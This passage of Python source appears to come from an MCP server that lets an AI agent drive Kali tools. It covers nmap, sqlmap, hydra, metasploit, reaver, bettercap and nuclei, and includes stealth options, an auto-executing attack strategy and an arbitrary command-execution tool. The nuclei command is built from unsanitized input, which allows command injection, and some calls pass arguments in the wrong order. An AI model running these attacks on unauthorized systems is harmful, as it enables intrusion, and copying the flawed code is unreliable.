        if not OPTIMIZATION_ENABLED:
            return {
                "optimization_enabled": False,
                "message": "优化模块未启用"
            }

        try:
            # 获取连接池统计
            pool_manager = get_connection_pool()
            pool_stats = pool_manager.get_stats()

            # 获取缓存统计
            cache = get_result_cache()
            cache_stats = cache.get_stats()

            return {
                "optimization_enabled": True,
                "connection_pool": pool_stats,
                "result_cache": cache_stats,
                "performance_boost": {
                    "connection_reuse_rate": pool_stats.get('reuse_rate', '0%'),
                    "cache_hit_rate": cache_stats.get('hit_rate', '0%'),
                    "estimated_speedup": "30-50%"
                }
            }

        except Exception as e:
            return {
                "optimization_enabled": True,
                "error": f"获取统计信息失败: {str(e)}"
            }

    @mcp.tool()
    async def clear_cache() -> Dict[str, Any]:
        """
        清空结果缓存

        Returns:
            清空结果
        """
        if not OPTIMIZATION_ENABLED:
            return {"success": False, "message": "优化模块未启用"}

        try:
            cache = get_result_cache()
            cleared_count = cache.clear_all()

            return {
                "success": True,
                "cleared_files": cleared_count,
                "message": f"已清空 {cleared_count} 个缓存文件"
            }

        except Exception as e:
            return {
                "success": False,
                "error": f"清空缓存失败: {str(e)}"
            }

    # ==================== 传统工具 (增强版) ====================

    @mcp.tool()
    def nmap_scan(target: str, scan_type: str = "-sV", ports: str = "", additional_args: str = "",
                  intelligent_optimization: bool = True, target_type: str = "unknown",
                  time_constraint: str = "quick", stealth_mode: bool = False) -> Dict[str, Any]:
        """
        Execute an Nmap scan against a target with intelligent parameter optimization.

        Args:
            target: The IP address or hostname to scan
            scan_type: Scan type (e.g., -sV for version detection)
            ports: Comma-separated list of ports or port ranges
            additional_args: Additional Nmap arguments
            intelligent_optimization: Enable intelligent parameter optimization
            target_type: Target type (web, network, database, windows, linux)
            time_constraint: Time constraint (quick, standard, thorough)
            stealth_mode: Enable stealth mode

        Returns:
            Scan results with intelligent analysis
        """
        data = {
            "target": target,
            "scan_type": scan_type,
            "ports": ports,
            "additional_args": additional_args,
            "intelligent_optimization": intelligent_optimization,
            "target_type": target_type,
            "time_constraint": time_constraint,
            "stealth_mode": stealth_mode
        }
        return executor.execute_tool_with_data("nmap", data)

    @mcp.tool()
    def gobuster_scan(url: str, mode: str = "dir", wordlist: str = "/usr/share/wordlists/dirb/common.txt",
                     additional_args: str = "", intelligent_optimization: bool = True,
                     target_type: str = "web", time_constraint: str = "quick", stealth_mode: bool = False) -> Dict[str, Any]:
        """
        Execute Gobuster to find directories, DNS subdomains, or virtual hosts with intelligent optimization.

        Args:
            url: The target URL
            mode: Scan mode (dir, dns, fuzz, vhost)
            wordlist: Path to wordlist file
            additional_args: Additional Gobuster arguments
            intelligent_optimization: Enable intelligent parameter optimization
            target_type: Target type (web, cms, api, etc.)
            time_constraint: Time constraint (quick, standard, thorough)
            stealth_mode: Enable stealth mode

        Returns:
            Scan results with intelligent analysis
        """
        data = {
            "url": url,
            "mode": mode,
            "wordlist": wordlist,
            "additional_args": additional_args,
            "intelligent_optimization": intelligent_optimization,
            "target_type": target_type,
            "time_constraint": time_constraint,
            "stealth_mode": stealth_mode
        }
        return executor.execute_tool_with_data("gobuster", data)

    @mcp.tool()
    def dirb_scan(url: str, wordlist: str = "/usr/share/wordlists/dirb/common.txt", additional_args: str = "") -> Dict[str, Any]:
        """
        Execute Dirb web content scanner.
        
        Args:
            url: The target URL
            wordlist: Path to wordlist file
            additional_args: Additional Dirb arguments
            
        Returns:
            Scan results
        """
        data = {
            "url": url,
            "wordlist": wordlist,
            "additional_args": additional_args
        }
        return executor.execute_tool_with_data("dirb", data)

    @mcp.tool()
    def nikto_scan(target: str, additional_args: str = "") -> Dict[str, Any]:
        """
        Execute Nikto web server scanner.
        
        Args:
            target: The target URL or IP
            additional_args: Additional Nikto arguments
            
        Returns:
            Scan results
        """
        data = {
            "target": target,
            "additional_args": additional_args
        }
        return executor.execute_tool_with_data("nikto", data)

    @mcp.tool()
    def sqlmap_scan(url: str, data: str = "", additional_args: str = "") -> Dict[str, Any]:
        """
        Execute SQLmap SQL injection scanner.
        
        Args:
            url: The target URL
            data: POST data string
            additional_args: Additional SQLmap arguments
            
        Returns:
            Scan results
        """
        post_data = {
            "url": url,
            "data": data,
            "additional_args": additional_args
        }
        return executor.execute_tool_with_data("sqlmap", post_data)

    @mcp.tool()
    def metasploit_run(module: str, options: Dict[str, Any] = {}) -> Dict[str, Any]:
        """
        Execute a Metasploit module.
        
        Args:
            module: The Metasploit module path
            options: Dictionary of module options
            
        Returns:
            Module execution results
        """
        data = {
            "module": module,
            "options": options
        }
        return executor.execute_tool_with_data("metasploit", data)

    @mcp.tool()
    def hydra_attack(
        target: str, 
        service: str, 
        username: str = "", 
        username_file: str = "", 
        password: str = "", 
        password_file: str = "", 
        additional_args: str = ""
    ) -> Dict[str, Any]:
        """
        Execute Hydra password cracking tool.
        
        Args:
            target: Target IP or hostname
            service: Service to attack (ssh, ftp, http-post-form, etc.)
            username: Single username to try
            username_file: Path to username file
            password: Single password to try
            password_file: Path to password file
            additional_args: Additional Hydra arguments
            
        Returns:
            Attack results
        """
        data = {
            "target": target,
            "service": service,
            "username": username,
            "username_file": username_file,
            "password": password,
            "password_file": password_file,
            "additional_args": additional_args
        }
        return executor.execute_tool_with_data("hydra", data)

    @mcp.tool()
    def john_crack(
        hash_file: str, 
        wordlist: str = "/usr/share/wordlists/rockyou.txt", 
        format_type: str = "", 
        additional_args: str = ""
    ) -> Dict[str, Any]:
        """
        Execute John the Ripper password cracker.
        
        Args:
            hash_file: Path to file containing hashes
            wordlist: Path to wordlist file
            format_type: Hash format type
            additional_args: Additional John arguments
            
        Returns:
            Cracking results
        """
        data = {
            "hash_file": hash_file,
            "wordlist": wordlist,
            "format": format_type,
            "additional_args": additional_args
        }
        return executor.execute_tool_with_data("john", data)

    @mcp.tool()
    def wpscan_analyze(url: str, additional_args: str = "") -> Dict[str, Any]:
        """
        Execute WPScan WordPress vulnerability scanner.
        
        Args:
            url: The target WordPress URL
            additional_args: Additional WPScan arguments
            
        Returns:
            Scan results
        """
        data = {
            "url": url,
            "additional_args": additional_args
        }
        return executor.execute_tool_with_data("wpscan", data)

    @mcp.tool()
    def enum4linux_scan(target: str, additional_args: str = "-a") -> Dict[str, Any]:
        """
        Execute Enum4linux Windows/Samba enumeration tool.
        
        Args:
            target: The target IP or hostname
            additional_args: Additional enum4linux arguments
            
        Returns:
            Enumeration results
        """
        data = {
            "target": target,
            "additional_args": additional_args
        }
        return executor.execute_tool_with_data("enum4linux", data)

    @mcp.tool()
    def server_health() -> Dict[str, Any]:
        """
        Check the health status of the Kali API server.

        Returns:
            Server health information
        """
        return {"success": True, "status": "本地执行模式", "message": "无需健康检查"}

    # ==================== AI上下文感知工具 ====================

    @mcp.tool()
    def ai_create_session(target: str = "", attack_mode: str = "pentest", session_name: str = "") -> Dict[str, Any]:
        """
        创建新的AI上下文感知会话 - 启用持续对话状态管理

        Args:
            target: 目标IP地址、域名或URL
            attack_mode: 攻击模式 (pentest, ctf, analysis)
            session_name: 自定义会话名称（可选）

        Returns:
            新创建的会话信息和初始建议
        """
        try:
            session = ai_context_manager.create_session(target, attack_mode)
            if session_name:
                session.context_metadata["custom_name"] = session_name

            # 立即分析目标并生成初始策略建议
            if target:
                initial_analysis = ai_context_manager.strategy_engine.analyze_context(session, f"分析目标 {target}")
                session.context_metadata["initial_analysis"] = initial_analysis

            return {
                "success": True,
                "session_id": session.session_id,
                "session_summary": session.get_context_summary(),
                "initial_strategy_recommendations": session.context_metadata.get("initial_analysis", {}),
                "next_steps": ai_context_manager.get_session_insights(session.session_id),
                "message": f"AI会话已创建，会话ID: {session.session_id}"
            }
        except Exception as e:
            logger.error(f"AI session creation error: {str(e)}")
            return {"success": False, "error": str(e)}

    @mcp.tool()
    def ai_analyze_intent(user_message: str, session_id: str = "") -> Dict[str, Any]:
        """
        AI意图分析 - 分析用户输入并提供智能建议

        Args:
            user_message: 用户输入的消息
            session_id: 会话ID（可选）

        Returns:
            意图分析结果和智能建议
        """
        try:
            session = ai_context_manager.get_or_create_session(session_id)

            # 分析用户意图
            intent = ai_context_manager.analyze_user_intent(user_message)

            # 生成上下文感知的响应
            contextual_response = ai_context_manager.generate_contextual_response(session, user_message)

            # 更新目标（如果从消息中提取到了新目标）
            if intent.get("target_extraction") and not session.target:
                session.target = intent["target_extraction"]
                session.context_metadata["target_auto_extracted"] = True

            return {
                "success": True,
                "session_id": session.session_id,
                "intent_analysis": intent,
                "contextual_response": contextual_response,
                "session_updated": bool(intent.get("target_extraction")),
                "recommended_tools": contextual_response.get("strategy_recommendations", [])
            }
        except Exception as e:
            logger.error(f"AI intent analysis error: {str(e)}")
            return {"success": False, "error": str(e)}

    @mcp.tool()
    def ai_get_strategy_recommendations(session_id: str = "", user_context: str = "") -> Dict[str, Any]:
        """
        获取AI策略建议 - 基于当前会话上下文推荐最佳攻击策略

        Args:
            session_id: 会话ID（可选）
            user_context: 额外的用户上下文信息

        Returns:
            详细的策略建议和执行计划
        """
        try:
            session = ai_context_manager.get_or_create_session(session_id)

            # 获取策略建议
            strategy_analysis = ai_context_manager.strategy_engine.analyze_context(session, user_context)

            # 获取会话洞察
            insights = ai_context_manager.get_session_insights(session.session_id)

            return {
                "success": True,
                "session_id": session.session_id,
                "strategy_analysis": strategy_analysis,
                "session_insights": insights,
                "execution_plan": {
                    "recommended_strategies": strategy_analysis.get("recommended_strategies", []),
                    "next_actions": insights.get("next_recommendations", []),
                    "estimated_completion_time": "根据策略复杂度而定"
                },
                "context_summary": session.get_context_summary()
            }
        except Exception as e:
            logger.error(f"AI strategy recommendations error: {str(e)}")
            return {"success": False, "error": str(e)}

    @mcp.tool()
    def ai_execute_strategy(strategy_name: str, session_id: str = "", auto_execute: bool = False) -> Dict[str, Any]:
        """
        AI策略执行 - 自动执行推荐的攻击策略

        Args:
            strategy_name: 策略名称 (web_comprehensive, ctf_quick_solve, network_recon, pwn_exploitation, adaptive_multi)
            session_id: 会话ID（可选）
            auto_execute: 是否自动执行所有相关工具

        Returns:
            策略执行结果和进展状态
        """
        try:
            session = ai_context_manager.get_or_create_session(session_id)
            strategy_tools = ai_context_manager.strategy_engine.get_strategy_tools(strategy_name)

            if not strategy_tools:
                return {"success": False, "error": f"Unknown strategy: {strategy_name}"}

            execution_results = {
                "strategy_name": strategy_name,
                "session_id": session.session_id,
                "tools_executed": [],
                "tools_failed": [],
                "overall_success": False,
                "execution_summary": {}
            }

            if auto_execute and session.target:
                # 自动执行策略中的工具
                successful_tools = 0
                total_tools = len(strategy_tools)

                for tool_name in strategy_tools:
                    try:
                        # 根据工具类型调用相应的函数
                        if tool_name == "nmap_scan":
                            result = nmap_scan(session.target, "-sS", "80,443,22", "-T5 --open --min-rate 5000 --max-retries 1")
                        elif tool_name == "gobuster_scan":
                            target_url = session.target if session.target.startswith("http") else f"http://{session.target}"
                            result = gobuster_scan(target_url, "dir", "/usr/share/wordlists/dirb/small.txt", "-t 100 --timeout 3s -q")
                        elif tool_name == "nuclei_web_scan":
                            target_url = session.target if session.target.startswith("http") else f"http://{session.target}"
                            result = nuclei_web_scan(target_url, "comprehensive")
                        elif tool_name == "analyze_target_intelligence":
                            result = analyze_target_intelligence(session.target)
                        elif tool_name == "comprehensive_recon":
                            result = comprehensive_recon(session.target)
                        else:
                            result = {"success": False, "error": f"Tool {tool_name} not implemented for auto-execution"}

                        if result.get("success", False):
                            execution_results["tools_executed"].append({
                                "tool": tool_name,
                                "result": result,
                                "timestamp": datetime.now().isoformat()
                            })
                            successful_tools += 1
                        else:
                            execution_results["tools_failed"].append({
                                "tool": tool_name,
                                "error": result.get("error", "Unknown error"),
                                "timestamp": datetime.now().isoformat()
                            })

                    except Exception as e:
                        execution_results["tools_failed"].append({
                            "tool": tool_name,
                            "error": str(e),
                            "timestamp": datetime.now().isoformat()
                        })

                execution_results["overall_success"] = successful_tools > 0
                execution_results["execution_summary"] = {
                    "successful_tools": successful_tools,
                    "total_tools": total_tools,
                    "success_rate": f"{(successful_tools/total_tools)*100:.1f}%"
                }

                # 更新会话状态
                session.completed_tasks.append(f"strategy_{strategy_name}")
                session.current_strategy = strategy_name

            else:
                # 仅返回策略工具列表，不自动执行
                execution_results["tools_to_execute"] = strategy_tools
                execution_results["auto_execution_disabled"] = True
                execution_results["message"] = f"Strategy {strategy_name} prepared. Set auto_execute=True to run automatically."

            return {
                "success": True,
                "execution_results": execution_results,
                "session_updated": True
            }

        except Exception as e:
            logger.error(f"AI strategy execution error: {str(e)}")
            return {"success": False, "error": str(e)}

    @mcp.tool()
    def ai_update_session_context(session_id: str, discovered_info: Dict[str, Any],
                                tools_used: List[str] = None, user_feedback: str = "") -> Dict[str, Any]:
        """
        更新AI会话上下文 - 手动更新会话状态和发现的信息

        Args:
            session_id: 会话ID
            discovered_info: 新发现的信息 (例: {"open_ports": [80, 443], "vulnerabilities": ["SQL injection"]})
            tools_used: 使用的工具列表
            user_feedback: 用户反馈信息

        Returns:
            更新后的会话状态和新建议
        """
        try:
            session = ai_context_manager.get_or_create_session(session_id)

            # 更新发现的资产
            for key, value in discovered_info.items():
                if key in session.discovered_assets:
                    if isinstance(session.discovered_assets[key], list):
                        session.discovered_assets[key].extend(value if isinstance(value, list) else [value])
                    else:
                        session.discovered_assets[key] = value
                else:
                    session.discovered_assets[key] = value

            # 添加到对话历史
            if user_feedback:
                session.add_conversation(
                    user_message=f"Context update: {user_feedback}",
                    ai_response="Session context updated with new discoveries",
                    tools_used=tools_used or []
                )

            # 更新知识库
            for category, data in discovered_info.items():
                ai_context_manager.update_knowledge_base("session_discoveries", f"{session.session_id}_{category}", data)

            # 获取更新后的洞察
            insights = ai_context_manager.get_session_insights(session.session_id)

            return {
                "success": True,
                "session_id": session.session_id,
                "updated_context": session.get_context_summary(),
                "new_insights": insights,
                "next_recommendations": insights.get("next_recommendations", []),
                "message": "Session context updated successfully"
            }

        except Exception as e:
            logger.error(f"AI session context update error: {str(e)}")
            return {"success": False, "error": str(e)}

    @mcp.tool()
    def ai_get_session_history(session_id: str = "", include_full_details: bool = False) -> Dict[str, Any]:
        """
        获取AI会话历史 - 查看完整的对话历史和分析进展

        Args:
            session_id: 会话ID（可选，默认当前会话）
            include_full_details: 是否包含完整的工具执行详情

        Returns:
            完整的会话历史和分析摘要
        """
        try:
            session = ai_context_manager.get_or_create_session(session_id)

            history = {
                "session_summary": session.get_context_summary(),
                "conversation_history": session.conversation_history,
                "discovered_assets": session.discovered_assets,
                "completed_tasks": session.completed_tasks,
                "timeline": []
            }

            # 生成时间线
            for conv in session.conversation_history:
                history["timeline"].append({
                    "timestamp": conv["timestamp"],
                    "event_type": "conversation",
                    "summary": conv["user_message"][:100] + "..." if len(conv["user_message"]) > 100 else conv["user_message"],
                    "tools_used": conv.get("tools_used", [])
                })

            if not include_full_details:
                # 简化对话历史，只保留摘要
                simplified_history = []
                for conv in session.conversation_history:
                    simplified_history.append({
                        "timestamp": conv["timestamp"],
                        "user_message_summary": conv["user_message"][:50] + "..." if len(conv["user_message"]) > 50 else conv["user_message"],
                        "tools_used": conv.get("tools_used", []),
                        "session_context": conv.get("session_context", {})
                    })
                history["conversation_history"] = simplified_history

            return {
                "success": True,
                "session_id": session.session_id,
                "session_history": history,
                "analysis": {
                    "total_interactions": len(session.conversation_history),
                    "session_duration": str(datetime.now() - session.start_time),
                    "unique_tools_used": len(set(
                        tool for conv in session.conversation_history
                        for tool in conv.get("tools_used", [])
                    )),
                    "discovery_progress": f"{len(session.discovered_assets)} categories discovered"
                }
            }

        except Exception as e:
            logger.error(f"AI session history error: {str(e)}")
            return {"success": False, "error": str(e)}

    @mcp.tool()
    def ai_smart_continuation(session_id: str = "", user_hint: str = "") -> Dict[str, Any]:
        """
        AI智能续接 - 基于当前上下文智能推荐下一步操作

        Args:
            session_id: 会话ID（可选）
            user_hint: 用户提示或偏好（可选）

        Returns:
            智能推荐的下一步操作和执行计划
        """
        try:
            session = ai_context_manager.get_or_create_session(session_id)

            # 分析当前进展
            insights = ai_context_manager.get_session_insights(session.session_id)

            # 如果有用户提示，结合分析
            combined_context = f"{user_hint} 当前目标: {session.target}" if user_hint else f"继续分析目标: {session.target}"
            contextual_response = ai_context_manager.generate_contextual_response(session, combined_context)

            # 生成智能建议
            smart_recommendations = []

            # 基于已完成任务推荐下一步
            if "nmap_scan" in str(session.completed_tasks):
                smart_recommendations.append({
                    "priority": "high",
                    "action": "深入漏洞扫描",
                    "tools": ["nuclei_scan", "nikto_scan"],
                    "reason": "端口扫描已完成，建议进行漏洞检测"
                })

            if len(session.discovered_assets.get("open_ports", [])) > 0:
                smart_recommendations.append({
                    "priority": "medium",
                    "action": "服务枚举",
                    "tools": ["enum4linux_scan", "dnsrecon_scan"],
                    "reason": f"发现 {len(session.discovered_assets['open_ports'])} 个开放端口，建议枚举服务"
                })

            # 如果是CTF模式，优先Flag检测
            if session.attack_mode == "ctf":
                smart_recommendations.insert(0, {
                    "priority": "urgent",
                    "action": "CTF Flag搜索",
                    "tools": ["get_detected_flags", "ctf_quick_scan"],
                    "reason": "CTF模式下优先搜索Flag"
                })

            return {
                "success": True,
                "session_id": session.session_id,
                "current_progress": insights,
                "smart_recommendations": smart_recommendations,
                "contextual_insights": contextual_response,
                "continuation_strategy": {
                    "next_phase": self._determine_next_phase(session),
                    "estimated_time": self._estimate_completion_time(session),
                    "confidence_level": self._calculate_confidence(session)
                }
            }

        except Exception as e:
            logger.error(f"AI smart continuation error: {str(e)}")
            return {"success": False, "error": str(e)}

    def _determine_next_phase(self, session: SessionContext) -> str:
        """确定下一个攻击阶段"""
        completed = len(session.completed_tasks)
        if completed == 0:
            return "reconnaissance"
        elif completed < 3:
            return "vulnerability_discovery"
        elif completed < 5:
            return "exploitation"
        else:
            return "post_exploitation"

    def _estimate_completion_time(self, session: SessionContext) -> str:
        """估算完成时间"""
        if session.attack_mode == "ctf":
            return "5-15 minutes"
        elif len(session.discovered_assets) > 3:
            return "20-45 minutes"
        else:
            return "30-60 minutes"

    def _calculate_confidence(self, session: SessionContext) -> str:
        """计算置信度"""
        if len(session.discovered_assets) > 2 and len(session.completed_tasks) > 2:
            return "high"
        elif len(session.completed_tasks) > 0:
            return "medium"
        else:
            return "low"
    
    @mcp.tool()
    def execute_command(command: str) -> Dict[str, Any]:
        """
        Execute an arbitrary command on the Kali server.

        Args:
            command: The command to execute

        Returns:
            Command execution results
        """
        return executor.execute_command(command)

    @mcp.tool()
    def nuclei_scan(target: str, templates: str = "", severity: str = "critical,high,medium",
                   tags: str = "", output_format: str = "json") -> Dict[str, Any]:
        """
        Execute Nuclei vulnerability scanner.

        Args:
            target: Target URL, IP, or domain to scan
            templates: Specific templates to use (e.g., 'cves/', 'http/misconfiguration/')
            severity: Severity levels to include (critical,high,medium,low,info)
            tags: Tags to filter templates (e.g., 'sqli,xss,rce')
            output_format: Output format (json or text)

        Returns:
            Nuclei scan results
        """
        # 构建nuclei命令
        cmd_parts = ["nuclei", "-u", target]

        # 添加模板过滤
        if templates:
            cmd_parts.extend(["-t", templates])

        # 添加严重程度过滤
        if severity:
            cmd_parts.extend(["-severity", severity])

        # 添加标签过滤
        if tags:
            cmd_parts.extend(["-tags", tags])

        # 设置输出格式
        if output_format == "json":
            cmd_parts.append("-json")

        # 添加静默模式和其他优化参数
        cmd_parts.extend(["-silent", "-rate-limit", "100", "-timeout", "10"])

        command = " ".join(cmd_parts)
        return executor.execute_command(command)

    @mcp.tool()
    def nuclei_cve_scan(target: str, year: str = "", severity: str = "critical,high") -> Dict[str, Any]:
        """
        Execute Nuclei CVE vulnerability scan.

        Args:
            target: Target URL, IP, or domain to scan
            year: Specific CVE year to scan (e.g., '2023', '2024')
            severity: Severity levels to include

        Returns:
            CVE scan results
        """
        templates = f"cves/{year}/" if year else "cves/"
        return nuclei_scan(target, templates, severity, "", "json")

    @mcp.tool()
    def nuclei_web_scan(target: str, scan_type: str = "comprehensive") -> Dict[str, Any]:
        """
        Execute Nuclei web application security scan.

        Args:
            target: Target web application URL
            scan_type: Type of scan (quick, comprehensive, deep)

        Returns:
            Web application scan results
        """
        if scan_type == "quick":
            templates = "http/misconfiguration/,http/vulnerabilities/"
            severity = "critical,high"
        elif scan_type == "comprehensive":
            templates = "http/,vulnerabilities/web/"
            severity = "critical,high,medium"
        elif scan_type == "deep":
            templates = "http/,vulnerabilities/,cves/,exposures/"
            severity = "critical,high,medium,low"
        else:
            templates = "http/misconfiguration/"
            severity = "critical,high"

        return nuclei_scan(target, templates, severity, "", "json")

    @mcp.tool()
    def nuclei_network_scan(target: str, scan_type: str = "basic") -> Dict[str, Any]:
        """
        Execute Nuclei network security scan.

        Args:
            target: Target IP or network range
            scan_type: Type of scan (basic, full)

        Returns:
            Network scan results
        """
        if scan_type == "full":
            templates = "network/,dns/,ssl/,misconfiguration/"
            severity = "critical,high,medium"
        else:
            templates = "network/,dns/"
            severity = "critical,high"

        return nuclei_scan(target, templates, severity, "", "json")

    @mcp.tool()
    def nuclei_technology_detection(target: str) -> Dict[str, Any]:
        """
        Execute Nuclei technology detection scan.

        Args:
            target: Target URL or IP to analyze

        Returns:
            Technology detection results
        """
        return nuclei_scan(target, "technologies/", "info", "", "json")

    @mcp.tool()
    def wfuzz_scan(target: str, wordlist: str = "/usr/share/wordlists/dirb/common.txt",
                   additional_args: str = "-c") -> Dict[str, Any]:
        """
        Execute Wfuzz web fuzzer.

        Args:
            target: Target URL with FUZZ keyword (e.g., 'http://example.com/FUZZ')
            wordlist: Path to wordlist file
            additional_args: Additional Wfuzz arguments

        Returns:
            Wfuzz scan results
        """
        data = {
            "target": target,
            "wordlist": wordlist,
            "additional_args": additional_args
        }
        return executor.execute_tool_with_data("wfuzz", data)

    @mcp.tool()
    def wafw00f_scan(target: str, additional_args: str = "-a") -> Dict[str, Any]:
        """
        Execute wafw00f WAF detection.

        Args:
            target: Target URL to scan for WAF
            additional_args: Additional wafw00f arguments

        Returns:
            WAF detection results
        """
        data = {
            "target": target,
            "additional_args": additional_args
        }
        return executor.execute_tool_with_data("wafw00f", data)

    @mcp.tool()
    def sublist3r_scan(domain: str, additional_args: str = "-v") -> Dict[str, Any]:
        """
        Execute Sublist3r subdomain enumeration.

        Args:
            domain: Target domain to enumerate subdomains
            additional_args: Additional Sublist3r arguments

        Returns:
            Subdomain enumeration results
        """
        data = {
            "domain": domain,
            "additional_args": additional_args
        }
        return executor.execute_tool_with_data("sublist3r", data)

    @mcp.tool()
    def masscan_scan(target: str, ports: str = "80,443", rate: str = "1000",
                     additional_args: str = "") -> Dict[str, Any]:
        """
        Execute Masscan high-speed port scanner.

        Args:
            target: Target IP or network range
            ports: Ports to scan (e.g., "80,443,8080")
            rate: Scan rate (packets per second)
            additional_args: Additional Masscan arguments

        Returns:
            High-speed port scan results
        """
        data = {
            "target": target,
            "ports": ports,
            "rate": rate,
            "additional_args": additional_args
        }
        return executor.execute_tool_with_data("masscan", data)

    @mcp.tool()
    def dnsrecon_scan(domain: str, scan_type: str = "-t std",
                      additional_args: str = "") -> Dict[str, Any]:
        """
        Execute DNSrecon for comprehensive DNS enumeration.

        Args:
            domain: Target domain for DNS enumeration
            scan_type: Type of DNS scan (e.g., "-t std", "-t axfr", "-t brt")
            additional_args: Additional DNSrecon arguments

        Returns:
            DNS enumeration results
        """
        data = {
            "domain": domain,
            "scan_type": scan_type,
            "additional_args": additional_args
        }
        return executor.execute_tool_with_data("dnsrecon", data)

    @mcp.tool()
    def wpscan_scan(target: str, api_token: str = "",
                    additional_args: str = "--enumerate p,t,u") -> Dict[str, Any]:
        """
        Execute WPScan for WordPress security testing.

        Args:
            target: Target WordPress URL
            api_token: WPScan API token for vulnerability data
            additional_args: Additional WPScan arguments

        Returns:
            WordPress security scan results
        """
        data = {
            "target": target,
            "api_token": api_token,
            "additional_args": additional_args
        }
        return executor.execute_tool_with_data("wpscan", data)

    @mcp.tool()
    def reaver_attack(interface: str, bssid: str,
                      additional_args: str = "-vv") -> Dict[str, Any]:
        """
        Execute Reaver for WPS PIN attacks.

        Args:
            interface: Wireless interface in monitor mode
            bssid: Target AP BSSID
            additional_args: Additional Reaver arguments

        Returns:
            WPS attack results
        """
        data = {
            "interface": interface,
            "bssid": bssid,
            "additional_args": additional_args
        }
        return executor.execute_tool_with_data("reaver", data)

    @mcp.tool()
    def bettercap_attack(interface: str, caplet: str = "",
                         additional_args: str = "") -> Dict[str, Any]:
        """
        Execute Bettercap for network attacks and reconnaissance.

        Args:
            interface: Network interface to use
            caplet: Bettercap caplet script to run
            additional_args: Additional Bettercap arguments

        Returns:
            Network attack results
        """
        data = {
            "interface": interface,
            "caplet": caplet,
            "additional_args": additional_args
        }
        return executor.execute_tool_with_data("bettercap", data)

    @mcp.tool()
    def binwalk_analysis(file_path: str, extract: bool = False,
                         additional_args: str = "") -> Dict[str, Any]:
        """
        Execute Binwalk for firmware analysis and extraction.

        Args:
            file_path: Path to firmware file to analyze
            extract: Whether to extract found filesystems
            additional_args: Additional Binwalk arguments

        Returns:
            Firmware analysis results
        """
        data = {
            "file_path": file_path,
            "extract": extract,
            "additional_args": additional_args
        }
        return executor.execute_tool_with_data("binwalk", data)

    @mcp.tool()
    def theharvester_osint(domain: str, sources: str = "google,bing,yahoo",
                           limit: str = "500", additional_args: str = "") -> Dict[str, Any]:
        """
        Execute theHarvester for OSINT and information gathering.

        Args:
            domain: Target domain for information gathering
            sources: Data sources to use (e.g., "google,bing,yahoo,linkedin")
            limit: Maximum number of results per source
            additional_args: Additional theHarvester arguments

        Returns:
            OSINT gathering results
        """
        data = {
            "domain": domain,
            "sources": sources,
            "limit": limit,
            "additional_args": additional_args
        }
        return executor.execute_tool_with_data("theharvester", data)

    @mcp.tool()
    def netdiscover_scan(interface: str = "", range_ip: str = "",
                         passive: bool = False, additional_args: str = "") -> Dict[str, Any]:
        """
        Execute Netdiscover for network host discovery.

        Args:
            interface: Network interface to use
            range_ip: IP range to scan (e.g., "192.168.1.0/24")
            passive: Use passive mode (ARP sniffing)
            additional_args: Additional Netdiscover arguments

        Returns:
            Network discovery results
        """
        data = {
            "interface": interface,
            "range": range_ip,
            "passive": passive,
            "additional_args": additional_args
        }
        return executor.execute_tool_with_data("netdiscover", data)

    @mcp.tool()
    def medusa_bruteforce(target: str, username: str = "",
                          password_list: str = "/usr/share/wordlists/rockyou.txt",
                          service: str = "ssh", additional_args: str = "") -> Dict[str, Any]:
        """
        Execute Medusa for password brute force attacks.

        Args:
            target: Target host or IP address
            username: Username to attack (optional for user enumeration)
            password_list: Path to password wordlist
            service: Service to attack (ssh, ftp, http, etc.)
            additional_args: Additional Medusa arguments

        Returns:
            Password attack results
        """
        data = {
            "target": target,
            "username": username,
            "password_list": password_list,
            "service": service,
            "additional_args": additional_args
        }
        return executor.execute_tool_with_data("medusa", data)

    @mcp.tool()
    def comprehensive_network_scan(target: str, deep_scan: bool = False) -> Dict[str, Any]:
        """
        Execute comprehensive network reconnaissance workflow.

        Args:
            target: Target network or host
            deep_scan: Whether to perform deep scanning

        Returns:
            Comprehensive network scan results
        """
        results = {
            "target": target,
            "timestamp": datetime.now().isoformat(),
            "workflow": "comprehensive_network_scan",
            "phases": {}
        }

        try:
            # Phase 1: Fast port discovery with Masscan
            logger.info(f"Phase 1: Fast port discovery on {target}")
            masscan_result = masscan_scan(target, "1-65535", "5000", "--open")
            results["phases"]["1_fast_port_scan"] = masscan_result

            # Phase 2: Detailed service enumeration with Nmap
            if masscan_result.get("success") and deep_scan:
                logger.info(f"Phase 2: Service enumeration on {target}")
                nmap_result = nmap_scan(target, "-sV -sC", "", "-T4")
                results["phases"]["2_service_enum"] = nmap_result

            # Phase 3: Network discovery
            logger.info(f"Phase 3: Network discovery")
            netdiscover_result = netdiscover_scan("", target, False)
            results["phases"]["3_network_discovery"] = netdiscover_result

            # Phase 4: DNS enumeration if target is domain
            if not target.replace(".", "").replace("/", "").isdigit():
                logger.info(f"Phase 4: DNS enumeration for {target}")
                dns_result = dnsrecon_scan(target, "-t std")
                results["phases"]["4_dns_enum"] = dns_result

            results["success"] = True
            results["summary"] = f"Comprehensive network scan completed for {target}"

        except Exception as e:
            logger.error(f"Error in comprehensive network scan: {str(e)}")
            results["success"] = False
            results["error"] = str(e)

        return results

    @mcp.tool()
    def advanced_web_security_assessment(target: str, wordpress_check: bool = True) -> Dict[str, Any]:
        """
        Execute advanced web application security assessment.

        Args:
            target: Target web application URL
            wordpress_check: Whether to perform WordPress-specific checks

        Returns:
            Advanced web security assessment results
        """
        results = {
            "target": target,
            "timestamp": datetime.now().isoformat(),
            "workflow": "advanced_web_security_assessment",
            "phases": {}
        }

        try:
            # Phase 1: Technology detection
            logger.info(f"Phase 1: Technology detection for {target}")
            nuclei_tech = nuclei_technology_detection(target)
            results["phases"]["1_technology_detection"] = nuclei_tech

            # Phase 2: WAF detection
            logger.info(f"Phase 2: WAF detection for {target}")
            waf_result = wafw00f_scan(target)
            results["phases"]["2_waf_detection"] = waf_result

            # Phase 3: Directory enumeration with multiple tools
            logger.info(f"Phase 3: Directory enumeration for {target}")
            gobuster_result = gobuster_scan(target, "/usr/share/wordlists/dirb/big.txt", "dir")
            results["phases"]["3_directory_enum"] = gobuster_result

            # Phase 4: Web vulnerability scanning
            logger.info(f"Phase 4: Web vulnerability scanning for {target}")
            nuclei_web = nuclei_web_scan(target, "comprehensive")
            results["phases"]["4_web_vuln_scan"] = nuclei_web

            # Phase 5: WordPress specific testing
            if wordpress_check:
                logger.info(f"Phase 5: WordPress security testing for {target}")
                wp_result = wpscan_scan(target)
                results["phases"]["5_wordpress_scan"] = wp_result

            # Phase 6: SQL injection testing
            logger.info(f"Phase 6: SQL injection testing for {target}")
